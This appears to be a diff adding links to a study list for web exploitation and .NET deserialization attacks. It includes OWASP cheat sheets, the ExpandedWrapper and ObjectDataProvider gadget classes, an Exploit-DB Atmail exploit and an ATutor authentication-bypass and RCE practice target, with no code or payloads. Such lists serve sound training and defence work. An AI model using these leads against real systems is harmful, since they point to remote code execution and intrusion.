+https://portswigger.net/kb/issues/00101100_ssi-injection,Server Side Include Hacks2
+https://github.com/dnSpy/dnSpy/wiki/Making-an-Image-Easier-to-Debug,DNSPY Debugging Image Easier
+https://referencesource.microsoft.com/,Microsoft's DotNet Source Code Repo
+https://www.geeksforgeeks.org/c-sharp-generics-introduction/, Explanation of C# Generics
+https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html,OWASP Deserialization Cheat Sheet
+https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-1?view=netframework-4.8, C# Deserialization Gadget 1 ExpandedWrapper
+https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs,ExpandedWrapper Gadget Source Code
+https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2,C# Deserialization Gadget 2 ObjectDataProvider
+https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/how-to-specify-the-binding-source,How to specify the binding source C#
+https://docs.microsoft.com/en-us/dotnet/desktop/wpf/data/data-binding-overview?view=netdesktop-5.0, Data Binding Overview C#
+https://github.com/Contrast-Security-OSS/contrast-rO0, Java agent for preventing deserialization attacks
+https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html, Input Validation CheatSheet
+https://www.exploit-db.com/exploits/20009, Atmail Mail Server Appliance Web exploit practice
+https://sourceforge.net/projects/atutor/files/atutor_2_2_1/, ATutor Authentication Bypass and RCE White Box Practice(installation)
